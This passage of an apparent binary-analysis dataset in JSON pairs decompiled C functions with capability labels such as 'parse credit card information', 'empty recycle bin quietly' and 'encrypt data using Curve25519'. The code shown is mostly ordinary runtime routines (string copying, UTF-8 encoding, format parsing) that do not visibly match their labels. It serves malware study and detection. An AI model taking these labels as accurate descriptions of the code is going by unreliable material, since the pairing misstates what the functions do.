        "decompiled_code": "\nuint __cdecl fcn.00405b64(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x004cba81:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = 0;\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    iVar3 = arg_14h;\n                    piVar4 = arg_8h;\n                    iVar5 = arg_ch;\n                    if (arg_14h == -1) {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar4);\n                            *piVar4 = iVar1;\n                            piVar4 = piVar4 + 1;\n                            if (iVar1 == 0) break;\n                            iVar5 = iVar5 + -1;\n                        } while (iVar5 != 0);\n                    }\n                    else {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar4);\n                            *piVar4 = iVar1;\n                            piVar4 = piVar4 + 1;\n                            if ((iVar1 == 0) || (iVar5 = iVar5 + -1,  iVar5 == 0)) break;\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != 0);\n                        if (iVar3 == 0) {\n                            *piVar4 = 0;\n                        }\n                    }\n                    if (iVar5 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = 0;\n                        return 0x50;\n                    }\n                    *arg_8h = 0;\n                    puVar2 = fcn.00403a35();\n                    uVar6 = 0x22;\n                    goto code_r0x004cba6f;\n                }\n                *arg_8h = 0;\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x004cba81;\n    puVar2 = fcn.00403a35();\n    uVar6 = 0x16;\ncode_r0x004cba6f:\n    *puVar2 = uVar6;\n    fcn.004037ce();\n    return uVar6;\n}\n",
        "token_count": 617
    },
    "00405bd2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405bd2(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (0 < arg_10h) {\n        do {\n            cVar1 = fcn.0040170d(unaff_EBX & 0xffff0000 | arg_ch);\n            if (cVar1 == '\\0') {\n                *arg_14h = -1;\n                iVar2 = -1;\n            }\n            else {\n                *arg_14h = *arg_14h + 1;\n                iVar2 = *arg_14h;\n            }\n        } while ((iVar2 != -1) && (iVar3 = iVar3 + 1,  iVar3 < arg_10h));\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "004061bd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004061bd(void)\n\n{\n    if ((*0x572930 != -1) && (*0x572930 != -2)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x572930);\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "00406924": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.00406924(void)\n\n{\n    uint uVar1;\n    uint32_t arg_ch;\n    int32_t iVar2;\n    uint arg_8h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((*0x571e70 == -1) || (arg_ch = fcn.0040382d(*0x571e70),  arg_ch == 0)) {\n        iVar2 = fcn.004018b1(*0x571e70, 0xffffffff);\n        if (iVar2 != 0) {\n            arg_ch = fcn.00405088(1, 0x364);\n            if (arg_ch == 0) {\n                fcn.004018b1(*0x571e70, 0);\n                arg_8h = 0;\n            }\n            else {\n                iVar2 = fcn.004018b1(*0x571e70, arg_ch);\n                if (iVar2 != 0) {\n                    fcn.004c27a8(arg_ch, 0x575218);\n                    fcn.0040640b(0);\n                    goto code_r0x004c2e58;\n                }\n                arg_8h = 0;\n                fcn.004018b1(*0x571e70, 0);\n            }\n            fcn.0040640b(arg_8h);\n        }\n    }\n    else if (arg_ch != 0xffffffff) goto code_r0x004c2e58;\n    arg_ch = 0;\ncode_r0x004c2e58:\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n    return -(arg_ch != 0) & arg_ch;\n}\n",
        "token_count": 377
    },
    "0040400c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040400c(int32_t arg_8h)\n\n{\n    if (*0x571cd0 != -1) {\n        if (arg_8h == 0) {\n            arg_8h = fcn.00404197(*0x571cd0);\n        }\n        fcn.004016a4(*0x571cd0, 0);\n        fcn.00404f1b(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "00401460": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401460(uint arg_8h)\n\n{\n    if (**0x574458 == '?') {\n        if ((*0x574458)[1] == '$') {\n            fcn.00402cde(arg_8h, 1);\n        }\n        else {\n            *0x574458 = *0x574458 + 1;\n            fcn.00402dc4(arg_8h, 0, 0);\n        }\n    }\n    else {\n        fcn.0040295a(arg_8h, 1, 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 134
    },
    "0040632f": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040632f(uint arg_8h)\n\n{\n    uint arg_10h;\n    uint var_8h;\n    \n    if (**0x574458 == '\\0') {\n        fcn.004017df(1);\n    }\n    else if (**0x574458 == '?') {\n        *0x574458 = *0x574458 + 1;\n        arg_10h = fcn.0040358a(&var_8h, 0);\n        fcn.00402eb4(arg_8h, 0x2d, arg_10h);\n    }\n    else {\n        fcn.0040358a(arg_8h, 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 162
    },
    "0040127b": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040127b(uint arg_8h, uint arg_ch)\n\n{\n    char extraout_CL;\n    uint *in_ECX;\n    uint *arg_8h_00;\n    int64_t iVar1;\n    uint arg_8h_01;\n    uint var_20h;\n    uchar uStack13;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = CONCAT44(arg_ch, arg_8h);\n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_8h._0_1_ = 0;\n    arg_8h_00 = &var_8h;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    do {\n        arg_8h_01 = 10;\n        arg_8h_00 = arg_8h_00 + -1;\n        iVar1 = fcn.00401820(iVar1, 10, 0, iVar1);\n        *arg_8h_00 = extraout_CL + '0';\n    } while (iVar1 != 0);\n    fcn.004067b2(arg_8h_00, &var_8h - arg_8h_00);\n    fcn.004030bc(arg_8h_01);\n    return;\n}\n",
        "token_count": 299
    },
    "00404a5c": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404a5c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    bool bVar1;\n    uint uVar2;\n    char extraout_CL;\n    uint *in_ECX;\n    uint unaff_EBX;\n    char *pcVar3;\n    char *arg_8h_00;\n    int64_t iVar4;\n    uint arg_8h_01;\n    uint var_28h;\n    uint var_24h;\n    uint var_1dh;\n    char acStack13 [5];\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    acStack13[2] = 0;\n    bVar1 = false;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    arg_8h_00 = acStack13 + 2;\n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    if ((arg_ch < 1) && (iVar4 = CONCAT44(arg_ch, arg_8h),  arg_ch < 0)) {\n        bVar1 = true;\n        iVar4 = CONCAT44(-(arg_ch + (arg_8h != 0)), -arg_8h);\n    }\n    do {\n        pcVar3 = arg_8h_00;\n        arg_8h_01 = 10;\n        arg_8h_00 = pcVar3 + -1;\n        uVar2 = iVar4;\n        iVar4 = fcn.00401820(iVar4, 10, 0, unaff_EBX);\n        unaff_EBX = uVar2;\n        *arg_8h_00 = extraout_CL + '0';\n    } while (iVar4 != 0);\n    if (bVar1) {\n        arg_8h_00 = pcVar3 + -2;\n        *arg_8h_00 = '-';\n    }\n    fcn.004067b2(arg_8h_00, acStack13 + (2 - arg_8h_00));\n    fcn.004030bc(arg_8h_01);\n    return;\n}\n",
        "token_count": 475
    },
    "00405277": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00405277(uint arg_8h)\n\n{\n    fcn.00403b02();\n    fcn.00403b02();\n    return *0x546d54;\n}\n",
        "token_count": 46
    },
    "00401299": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401299(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x556464);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x556460);\n}\n",
        "token_count": 128
    },
    "004016fe": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004016fe(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x556464);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x556460);\n}\n",
        "token_count": 128
    },
    "00401b18": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401b18(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x556464);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x556460);\n}\n",
        "token_count": 129
    },
    "00401f46": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401f46(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x555f94);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((arg_ch + iVar1 * 8 & 0x7fU) * 8 + 0x555f90);\n}\n",
        "token_count": 131
    },
    "00403436": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403436(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x555f94);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((arg_ch + iVar1 * 8 & 0x7fU) * 8 + 0x555f90);\n}\n",
        "token_count": 132
    },
    "00403b61": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403b61(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x556464);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x556460);\n}\n",
        "token_count": 131
    },
    "00403ec7": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403ec7(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x555f94);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((arg_ch + iVar1 * 8 & 0x7fU) * 8 + 0x555f90);\n}\n",
        "token_count": 131
    },
    "00404b6a": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404b6a(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x556464);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x556460);\n}\n",
        "token_count": 132
    },
    "00404dae": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404dae(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x555f94);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((arg_ch + iVar1 * 8 & 0x7fU) * 8 + 0x555f90);\n}\n",
        "token_count": 132
    },
    "004055ce": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004055ce(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x556464);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x556460);\n}\n",
        "token_count": 130
    },
    "004060b9": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004060b9(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x556464);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x556460);\n}\n",
        "token_count": 131
    },
    "004065d2": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004065d2(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x556464);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x556460);\n}\n",
        "token_count": 129
    },
    "004012bc": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004012bc(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x38 + *((lpCriticalSection >> 6) * 4 + 0x575220));\n    return;\n}\n",
        "token_count": 68
    },
    "00401348": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401348(uint8_t *arg_8h, uint32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    \n    if (arg_8h == NULL) {\n        arg_ch = 0;\n    }\n    else {\n        if (arg_ch != 0) {\n            if ((arg_ch & 0xffffff80) == 0) {\n                *arg_8h = arg_ch;\n                return 1;\n            }\n            if ((arg_ch & 0xfffff800) == 0) {\n                uVar3 = 0xc0;\n                iVar4 = 1;\n                iVar2 = iVar4;\n            }\n            else if ((arg_ch & 0xffff0000) == 0) {\n                if ((0xd7ff < arg_ch) && (arg_ch < 0xe000)) {\ncode_r0x004d8ef5:\n                    iVar2 = fcn.00402617(arg_10h);\n                    return iVar2;\n                }\n                iVar4 = 2;\n                uVar3 = 0xe0;\n                iVar2 = iVar4;\n            }\n            else {\n                if (((arg_ch & 0xffe00000) != 0) || (0x10ffff < arg_ch)) goto code_r0x004d8ef5;\n                iVar4 = 3;\n                uVar3 = 0xf0;\n                iVar2 = iVar4;\n            }\n            do {\n                uVar1 = arg_ch;\n                arg_ch = arg_ch >> 6;\n                arg_8h[iVar4] = uVar1 & 0x3f | 0x80;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            *arg_8h = arg_ch | uVar3;\n            *arg_10h = 0;\n            arg_10h[1] = 0;\n            return iVar2 + 1;\n        }\n        *arg_8h = arg_ch;\n    }\n    *arg_10h = arg_ch;\n    arg_10h[1] = arg_ch;\n    return 1;\n}\n",
        "token_count": 493
    },
    "0040150a": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040150a(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x38 + *((lpCriticalSection >> 6) * 4 + 0x575220));\n    return;\n}\n",
        "token_count": 68
    },
    "00406096": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406096(uint32_t arg_8h)\n\n{\n    return ((arg_8h & 0x3f) << 8 | arg_8h & 0x3f) << 0x10 | arg_8h;\n}\n",
        "token_count": 62
    },
    "00406762": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint8_t __cdecl fcn.00406762(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 9;\n    }\n    else {\n        if ((-1 < arg_8h) && (arg_8h < *0x575488)) {\n            return *(*((arg_8h >> 6) * 4 + 0x575220) + 0x28 + (arg_8h & 0x3f) * 0x38) & 0x40;\n        }\n        puVar1 = fcn.00403a35();\n        *puVar1 = 9;\n        fcn.004037ce();\n    }\n    return 0;\n}\n",
        "token_count": 187
    },
    "004cc40d": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.004cc40d(void)\n\n{\n    uint8_t *puVar1;\n    char in_AL;\n    uint32_t unaff_ESI;\n    \n    if (in_AL == '\\0') {\n        puVar1 = *((unaff_ESI >> 6) * 4 + 0x575220) + 0x28 + (unaff_ESI & 0x3f) * 0x38;\n        *puVar1 = *puVar1 & 0xfe;\n    }\n    fcn.004012bc(unaff_ESI);\n    return;\n}\n",
        "token_count": 127
    },
    "00402892": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nchar ** __cdecl fcn.00402892(char **arg_8h)\n\n{\n    char cVar1;\n    uint var_18h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    var_8h = NULL;\n    var_4h = NULL;\n    if (**0x574458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    // switch table (8 cases) at 0x48f58c\n    switch(**0x574458) {\n    case '0':\n    case '1':\n        var_10h = \"char \";\n        goto code_r0x0048f4ef;\n    case '2':\n    case '3':\n        var_10h = \"short \";\n        var_ch = 0x6;\n        break;\n    case '4':\n        goto code_r0x0048f502;\n    case '5':\n        var_10h = \"int \";\n        var_ch = 0x4;\n        break;\n    case '6':\n    case '7':\n        var_10h = \"long \";\ncode_r0x0048f4ef:\n        var_ch = 0x5;\n        break;\n    default:\n        arg_8h[1] = NULL;\n        *(arg_8h + 1) = 2;\n        *arg_8h = NULL;\n        return arg_8h;\n    }\n    fcn.004022f7(&var_10h);\ncode_r0x0048f502:\n    cVar1 = **0x574458;\n    *0x574458 = *0x574458 + 1;\n    if ((((cVar1 == '1') || (cVar1 == '3')) || (cVar1 == '5')) || (cVar1 == '7')) {\n        var_10h = \"unsigned \";\n        var_ch = 0x9;\n        fcn.00402d47(&var_10h);\n        fcn.004053b7(&var_10h, &var_8h);\n        var_8h = var_10h;\n        var_4h = var_ch;\n    }\n    *arg_8h = var_8h;\n    arg_8h[1] = var_4h;\n    return arg_8h;\n}\n",
        "token_count": 523
    },
    "00403224": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.00403224(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.004054b6();\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049d036:\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n        }\n        else {\n            do {\n                cVar1 = fcn.0040122b();\n                if (cVar1 == '\\0') {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049d0ea:\n                cVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x31) = cVar1;\n                if (cVar1 != '\\0') {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049d0fd;\n                    arg_ch = *(param_1 + 0x1c);\n                    arg_8h = *(param_1 + 0x31);\n                    uVar3 = fcn.004065d2(arg_8h, arg_ch);\n                    *(param_1 + 0x1c) = uVar3;\n                    cVar1 = fcn.00404f6b();\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n    // switch table (8 cases) at 0x49d126\n                    switch(*(param_1 + 0x1c)) {\n                    case 0:\n                        cVar1 = fcn.00401163();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049d0ea;\n                    case 2:\n                        cVar1 = fcn.004012a8();\n                        break;\n                    case 3:\n                        cVar1 = fcn.00404df9();\n                        break;\n                    case 4:\n                        goto code_r0x0049d0c4;\n                    case 5:\n                        cVar1 = fcn.00401fc8();\n                        break;\n                    case 6:\n                        cVar1 = fcn.00401ec9();\n                        break;\n                    case 7:\n                        cVar1 = fcn.004064f1(arg_8h, arg_ch, arg_8h, unaff_EBX, unaff_retaddr, param_2, param_3, param_4\n                                             , param_5, param_6, param_7);\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049d049;\n                    default:\n                        goto code_r0x0049d036;\n                    }\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049d0ea;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\ncode_r0x0049d0fd:\n                cVar1 = fcn.00404e8f();\n            } while (cVar1 != '\\0');\n        }\n    }\ncode_r0x0049d049:\n    return 0xffffffff;\ncode_r0x0049d0c4:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049d0ea;\n}\n",
        "token_count": 983
    },
    "004036e3": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004036e3(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.00402d83();\n    if (cVar2 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049d8d3:\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            fcn.004037ce();\n        }\n        else {\n            do {\n                cVar2 = fcn.00406442();\n                if (cVar2 == '\\0') {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049d988:\n                iVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x32) = iVar1;\n                if (iVar1 != 0) {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049d99f;\n                    uVar4 = fcn.00403b61(*(param_1 + 0x32), *(param_1 + 0x1c));\n                    *(param_1 + 0x1c) = uVar4;\n                    cVar2 = fcn.00402b03();\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n    // switch table (8 cases) at 0x49d9c7\n                    switch(*(param_1 + 0x1c)) {\n                    case 0:\n                        cVar2 = fcn.00402ac7();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049d988;\n                    case 2:\n                        cVar2 = fcn.00404bc9();\n                        break;\n                    case 3:\n                        cVar2 = fcn.00404a25();\n                        break;\n                    case 4:\n                        goto code_r0x0049d962;\n                    case 5:\n                        cVar2 = fcn.0040106e();\n                        break;\n                    case 6:\n                        cVar2 = fcn.004036f7();\n                        break;\n                    case 7:\n                        cVar2 = fcn.00405033();\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049d8e6;\n                    default:\n                        goto code_r0x0049d8d3;\n                    }\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049d988;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\ncode_r0x0049d99f:\n                cVar2 = fcn.00403ce2();\n            } while (cVar2 != '\\0');\n        }\n    }\ncode_r0x0049d8e6:\n    return 0xffffffff;\ncode_r0x0049d962:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049d988;\n}\n",
        "token_count": 862
    },
    "00404efd": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404efd(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.00405a15();\n    if (cVar2 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049d47d:\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            fcn.004037ce();\n        }\n        else {\n            do {\n                cVar2 = fcn.00402432();\n                if (cVar2 == '\\0') {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049d532:\n                iVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x32) = iVar1;\n                if (iVar1 != 0) {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049d549;\n                    uVar4 = fcn.00404b6a(*(param_1 + 0x32), *(param_1 + 0x1c));\n                    *(param_1 + 0x1c) = uVar4;\n                    cVar2 = fcn.00404d4a();\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n    // switch table (8 cases) at 0x49d571\n                    switch(*(param_1 + 0x1c)) {\n                    case 0:\n                        cVar2 = fcn.0040518c();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049d532;\n                    case 2:\n                        cVar2 = fcn.0040429b();\n                        break;\n                    case 3:\n                        cVar2 = fcn.0040186b();\n                        break;\n                    case 4:\n                        goto code_r0x0049d50c;\n                    case 5:\n                        cVar2 = fcn.00403c06();\n                        break;\n                    case 6:\n                        cVar2 = fcn.00404115();\n                        break;\n                    case 7:\n                        cVar2 = fcn.0040511e();\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049d490;\n                    default:\n                        goto code_r0x0049d47d;\n                    }\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049d532;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\ncode_r0x0049d549:\n                cVar2 = fcn.00405916();\n            } while (cVar2 != '\\0');\n        }\n    }\ncode_r0x0049d490:\n    return 0xffffffff;\ncode_r0x0049d50c:\n    *(param_1 + 0x28) = 0;\n    goto 